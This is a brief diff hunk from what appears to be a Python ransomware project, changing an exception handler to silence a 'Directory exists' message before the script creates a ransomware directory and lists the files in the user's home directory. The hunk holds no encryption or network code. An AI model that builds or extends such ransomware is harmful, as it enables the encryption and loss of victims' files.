@@ -104,8 +104,8 @@ def menu():
     try:
         os.mkdir(ransomware_path, 0700)
     except OSError:
-        print('Directory exists')
-
+        pass
+        
     # get the files in the home directory
     # /home/$USER
     files = get_files.find_files(test_path)
